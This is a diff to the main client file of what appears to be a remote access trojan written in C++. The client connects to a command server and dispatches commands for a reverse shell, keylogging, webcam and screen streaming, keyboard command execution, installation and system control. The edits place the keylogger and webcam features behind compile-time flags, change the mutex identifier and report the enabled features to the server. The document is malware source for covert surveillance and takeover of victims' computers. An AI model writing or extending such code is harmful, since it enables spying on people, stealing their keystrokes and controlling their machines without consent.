@@ -12,11 +12,10 @@
 #include "information/system/SystemInformation.h"
 #include "information/network/NetworkInformation.h"
 #include "reverse_shell/ReverseShell.h"
-#include "Keylogger/KeyLogger.h"
 #include "keyboard/KeyboardExecuter.h"
 #include "permission/Permission.h"
 #include "box_message/MessageBoxGUI.h"
-#include "screen/ScreenStreamer.h"
+
 #include "state/SystemState.h"
 #include "install/Install.h"
 
@@ -27,19 +26,28 @@
 
 #define TAG_NAME "Client"
 
-#define MUTEX "b6ff7a3d-5595-4862-aebe-881b2b046625"
+#define MUTEX "588bf0df-5ed3-4efa-9804-4f91767e8bb2"
 
 #define TIMING_RETRY 10000
 
-#define WEBCAM
+//#define WEBCAM "WLogs"
 
 #ifdef WEBCAM
 
 #include "webcam/WebcamManager.h"
+#include "screen/ScreenStreamer.h"
 
 #endif
 
-#define INSTALL_PATH 2
+//#define KEYLOGGER "KLogs"
+
+#ifdef KEYLOGGER
+
+#include "Keylogger/KeyLogger.h"
+
+#endif
+
+#define INSTALL_PATH (-1)
 
 #define SUBDIRECTORY_NAME "Client"
 
@@ -69,8 +77,10 @@ int main(int argc,char*argv[]) {
                 std::cout << "Connected to server!" << std::endl;
                 Stream stream(sock);
                 ReverseShell reverseShell;
-                KeyLogger keyLogger(stream);
+#ifdef KEYLOGGER
+                KeyLogger keyLogger(stream,KEYLOGGER);
                 keyLogger.tryStart();
+#endif
                 while (streamListening) {
                     int action = stream.readSize();
                     switch (action) {
@@ -87,6 +97,16 @@ int main(int argc,char*argv[]) {
                             std::cout << "GATHERING SYSTEM INFORMATION" << std::endl;
                             std::vector<std::string> informationVector = SystemInformation::getSystemInformation();
                             informationVector.emplace_back(TAG_NAME);
+#ifdef WEBCAM
+                            informationVector.emplace_back("true");
+#else
+                            informationVector.emplace_back("false");
+#endif
+#ifdef KEYLOGGER
+                            informationVector.emplace_back("true");
+#else
+                            informationVector.emplace_back("false");
+#endif
                             stream.sendList(informationVector);
                             break;
                         }
@@ -173,6 +193,7 @@ int main(int argc,char*argv[]) {
                             stream.sendString(response.c_str());
                             break;
                         }
+#ifdef KEYLOGGER
                         case 12: {
                             std::cout << "START KEYLOGGER" << std::endl;
                             keyLogger.tryStart();
@@ -210,6 +231,7 @@ int main(int argc,char*argv[]) {
                             stream.sendSize(keyLogger.isRecordingKeys());
                             break;
                         }
+#endif
                         case 16: {
                             std::cout << "REQUEST DEVICES (CAMERA)" << std::endl;
                             DeviceEnumerator de;
@@ -224,11 +246,8 @@ int main(int argc,char*argv[]) {
                             stream.sendList(webcamVector);
                             break;
                         }
-
-                        case 17: {
 #ifdef WEBCAM
-
-
+                            case 17: {
 
                             std::cout << "START WEBCAM" << std::endl;
                             std::string webcamName = stream.readString();
@@ -242,14 +261,14 @@ int main(int argc,char*argv[]) {
                                 std::cout << "Name: " << device.second.deviceName << std::endl;
                                 std::cout << "Path: " << device.second.devicePath << std::endl;
                                 if (device.second.deviceName == webcamName) {
-                                    WebcamManager webcam(stream, device.first, fragmented, FPS);
+                                    WebcamManager webcam(stream, device.first, fragmented, FPS,WEBCAM);
                                     webcam.startWebcam();
                                 }
                             }
-#endif
-                            break;
 
+                            break;
                         }
+#endif
                         case 18: {
                             std::cout << "keyboard command " << std::endl;
                             std::string keyboardCommand = stream.readString();
@@ -283,12 +302,14 @@ int main(int argc,char*argv[]) {
                             messageBoxThread.detach();
                             break;
                         }
+#ifdef WEBCAM
                         case 22: {
                             std::cout << "SCREEN STREAM" << std::endl;
                             ScreenStreamer screenStreamer(stream);
                             screenStreamer.sendPicture();
                             break;
                         }
+#endif
                         case 23: {
                             std::cout << "LOG OFF" << std::endl;
                             SystemState::setState(0);
